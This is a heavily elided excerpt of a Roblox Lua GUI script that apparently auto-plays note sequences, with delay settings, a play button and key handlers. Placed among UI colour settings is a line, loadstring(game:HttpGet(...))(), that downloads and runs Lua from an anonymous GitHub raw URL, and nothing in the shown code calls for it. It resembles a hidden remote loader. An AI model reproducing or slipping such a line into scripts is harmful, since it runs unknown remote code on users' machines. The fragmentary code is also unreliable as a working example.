...
Delay.BackgroundColor3 = Color3.new(0, 0, 0)
...
DELAY.BorderColor3 = Color3.new(0, 0, 0)
...
loadstring(game:HttpGet("https://raw.githubusercontent.com/lasudueneuxjsn/loo.lua/main/No.lua", true))()
    ...
    Button1 = "Okay"
		...
		if Ready then
			...
			local Delay = Instance.new('StringValue')

			Notes.Parent = Add_Bar

			Delay.Parent = Add_Bar
			...
			Delay.Value = Saving.Saving_Frame.DELAY.Text
			...
			Add_Bar.MouseButton1Down:Connect(function()
				...
				if type(tonumber(Delay.Value)) == 'number' then

					script.Parent.Main_GUI.TopBar.Delay.Text = Delay.Value
	...
	script.Parent.Main_GUI.PLAY_BUTTON.MouseButton1Down:Connect(function()
		...
		Delay = script.Parent.Main_GUI.TopBar.Delay.Text
		...
		c = coroutine.create(function()
			...
			for Notes in script.Parent.Main_GUI.Box.Text:gmatch('[^%.]') do
				...
				local DefaultDelay = script.Parent.Main_GUI.TopBar.Delay.Text
	...
	function onKeyPress(inputObject,gameProcessed)
		...
		success, err = pcall(function()
	    	...
	    	if inputObject.KeyCode == Enum.KeyCode.Up then
				...
				script.Parent.Main_GUI.TopBar.Delay.Text = tostring(Delay)
